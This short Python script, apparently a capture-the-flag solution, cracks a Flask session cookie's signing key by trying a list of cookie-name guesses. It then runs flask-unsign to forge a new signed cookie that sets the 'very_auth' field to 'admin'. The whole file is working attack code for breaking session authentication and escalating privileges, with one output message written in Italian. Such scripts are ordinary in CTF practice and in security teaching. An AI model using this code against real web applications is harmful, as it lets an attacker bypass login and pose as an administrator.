import flask
import itsdangerous
import base64
import zlib
import pickle
import subprocess


signed_cookie = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Z88_lA.ufueLpxNZyRIRYInEDqKRWNw6zA"

candidate_keys = [
    "snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread",
    "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter",
    "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon",
    "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen",
    "macaron", "black and white", "white chocolate macadamia"
]

# Flask's method to decode session cookies
class MockApp:
    secret_key = None

app = MockApp()

def decode_cookie(secret_key, cookie):
    """Try to decode a Flask session cookie using the given secret key."""
    try:
        app.secret_key = secret_key
        serializer = flask.sessions.SecureCookieSessionInterface().get_signing_serializer(app)
        data = serializer.loads(cookie)
        return data
    except itsdangerous.BadSignature:
        return None

# Iterate over the candidate keys
for key in candidate_keys:
    decoded_data = decode_cookie(key, signed_cookie)
    if decoded_data is not None:
        print(f"Found the secret key: {key}")
        print(f"Decoded session data: {decoded_data}")
        break
else:
    print("No matching key found.")




secret_key = "peanut butter"  

new_cookie = subprocess.run(
    ["flask-unsign", "--sign", "--secret", secret_key, "--cookie", '{"very_auth": "admin"}'],
    capture_output=True, text=True
).stdout.strip()

print(f"Nuovo cookie firmato: {new_cookie}")
